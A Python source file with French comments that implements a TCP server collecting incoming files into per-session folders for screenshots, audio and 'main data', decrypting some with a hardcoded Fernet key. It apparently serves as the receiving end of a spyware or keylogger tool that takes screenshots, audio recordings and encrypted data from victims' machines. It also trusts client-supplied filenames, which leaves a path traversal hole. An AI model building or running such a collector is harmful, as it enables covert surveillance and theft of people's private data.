"""
Serveur de réception ultra-simple et fiable
"""

import socket
import os
from pathlib import Path
import threading
import time
from cryptography.fernet import Fernet

class SimpleReceiverServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.receive_dir = Path.home() / 'received_data'
        self.key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
        self.running = True
        self.receive_dir.mkdir(exist_ok=True)
        
    def decrypt_file(self, encrypted_file, output_file):
        """Déchiffre un fichier"""
        try:
            with open(encrypted_file, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted_data = Fernet(self.key).decrypt(encrypted_data)
            
            with open(output_file, 'wb') as f:
                f.write(decrypted_data)
            
            print(f"✅ Déchiffré: {encrypted_file.name}")
            return True
            
        except Exception as e:
            print(f"❌ Erreur déchiffrement: {e}")
            return False

    def handle_client(self, conn, addr):
        """Gère une connexion client"""
        print(f"🔗 Connexion de {addr}")
        
        try:
            # Recevoir le type de fichier
            type_length = int.from_bytes(conn.recv(4), byteorder='big')
            file_type = conn.recv(type_length).decode('utf-8')
            
            # Recevoir le nom du fichier
            name_length = int.from_bytes(conn.recv(4), byteorder='big')
            filename = conn.recv(name_length).decode('utf-8')
            
            # Recevoir la taille
            file_size = int.from_bytes(conn.recv(8), byteorder='big')
            
            print(f"📦 Réception: {file_type} - {filename} ({file_size} octets)")
            
            # Créer le dossier de session
            timestamp = str(int(time.time()))
            session_dir = self.receive_dir / f"Session_{timestamp}"
            session_dir.mkdir(exist_ok=True)
            
            # Déterminer le dossier de destination
            if file_type == "SCREENSHOT":
                dest_dir = session_dir / "screenshots"
            elif file_type == "AUDIO":
                dest_dir = session_dir / "audio"
            else:
                dest_dir = session_dir / "main_data"
            
            dest_dir.mkdir(exist_ok=True)
            file_path = dest_dir / filename
            
            # Recevoir le fichier
            received = 0
            with open(file_path, 'wb') as f:
                while received < file_size:
                    chunk = conn.recv(min(8192, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            
            print(f"✅ Fichier reçu: {filename} ({received}/{file_size} octets)")
            
            # Déchiffrer si nécessaire
            if file_type == "MAIN_DATA" and filename.startswith('e_'):
                clear_name = filename[2:]
                clear_file = dest_dir / clear_name
                if self.decrypt_file(file_path, clear_file):
                    os.remove(file_path)
                    
        except Exception as e:
            print(f"❌ Erreur: {e}")
        finally:
            conn.close()
    
    def start(self):
        """Démarre le serveur"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            server_socket.settimeout(1)
            
            print(f"🎯 Serveur en écoute sur {self.host}:{self.port}")
            print("📁 Données reçues dans:", self.receive_dir)
            print("⏳ En attente de données...")
            
            while self.running:
                try:
                    conn, addr = server_socket.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    print("\n⏹ Arrêt du serveur...")
                    break
                except Exception as e:
                    print(f"❌ Erreur serveur: {e}")
                    continue

if __name__ == '__main__':
    server = SimpleReceiverServer()
    server.start()
